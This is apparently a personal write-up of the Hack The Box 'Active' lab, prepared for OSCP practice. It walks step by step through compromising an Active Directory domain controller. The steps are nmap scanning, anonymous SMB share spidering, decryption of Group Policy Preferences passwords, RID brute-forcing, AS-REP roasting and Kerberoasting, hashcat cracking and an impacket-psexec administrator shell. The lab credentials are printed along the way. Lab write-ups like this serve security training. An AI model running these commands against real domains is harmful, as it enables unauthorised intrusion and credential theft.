---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Active?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Active-1791230024747.webp)


![|290](../../0.%20Assets/Active-1791230051583.webp)

---

# Walkthrough


We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

Once we have the ports, we will do another `nmap` going more in detail

```
nmap $T -Pn -n -sVC  --min-rate 3000 -oX results.txt -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49167,49169
```


```

┌─[bl1nk㉿kali]─[~/engagements/Active/nmap]─[󰦝 10.10.15.226]─[ 10.129.158.220]
└─❯ nmap $T -Pn -n -sVC  --min-rate 3000 -oX results.txt -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49167,49169
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 22:00 +0200
Nmap scan report for 10.129.158.220
Host is up (0.025s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-05 20:00:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-10-05T20:01:41
|_  start_date: 2026-10-05T19:53:42
```


Let's add the domain name to the `/etc/hosts` for `kerberos` to properly work with out machine.

```
netexec smb $T
SMB         10.129.158.220  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

Let's try some enumeration

```
nxc smb $T -u '' -p '' --shares
```

![](../../0.%20Assets/Active-1791231684634.webp)

Okay let's see what we can get from here

```
netexec smb $T -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true
```

Well I found GPP credentials (left by an administrator to set up computers automatically)

![](../../0.%20Assets/Active-1791283117559.webp)

Let's decrypt them 

```
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

![](../../0.%20Assets/Active-1791283049846.webp)

And let's see if the credentials are correct

```
netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

![](../../0.%20Assets/Active-1791283171465.webp)

Great, let's see what we can do with these credentials


```
./nxcspray all $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

![](../../0.%20Assets/Active-1791283310796.webp)

Okay `ldap` and `smb`, let's do some share enumeration again

```
netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

![](../../0.%20Assets/Active-1791283910271.webp)

Great! now we are allowed to read `NETLOGON` , `SYSVOL` and `Users`
Let's get it

```
netexec smb "$T" -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
```

This spidering was not really working so I did manual enumeration

```
smbclient //$T/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
```

![](../../0.%20Assets/Active-1791284432880.webp)

And inside the share named as the user you can find the flag

![](../../0.%20Assets/Active-1791284451654.webp)

I went through the rest of folders and shares and didn't find much so let's move to something else.

Let's try retrieving users

```
netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute 10000
```

![](../../0.%20Assets/Active-1791285678842.webp)

There is not anything super interesting regarding users but `DC$`

Let's see with `as-rep` roasting what we can find

First let's get a clean list of users
```
netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute 10000  | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

![|514x182](../../0.%20Assets/Active-1791285779719.webp)

And now let's perform the attack

```
impacket-GetNPUsers 'active.htb/' \                               
  -usersfile users.txt \
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```

![](../../0.%20Assets/Active-1791285924074.webp)

No luck here, let's try `Kerberoasting`

![](../../0.%20Assets/Active-1791285992635.webp)

Bingo!

Add that entire string into a file and run `hashcat` against it

```
sudo hashcat -m 13100 admin.txt /usr/share/wordlists/rockyou.txt  --force
```


![](../../0.%20Assets/Active-1791286084982.webp)

Let's see if the credentials are valid

```
netexec smb $T -u 'administrator' -p 'Ticketmaster1968'
```

![](../../0.%20Assets/Active-1791286146583.webp)

Perfect, let's perform a pass the hash to enter through `smb` with `psexec` 

```
impacket-psexec active.htb/administrator:'Ticketmaster1968'@$T
```

![](../../0.%20Assets/Active-1791286255611.webp)

![](../../0.%20Assets/Active-1791286285755.webp)

And we are done!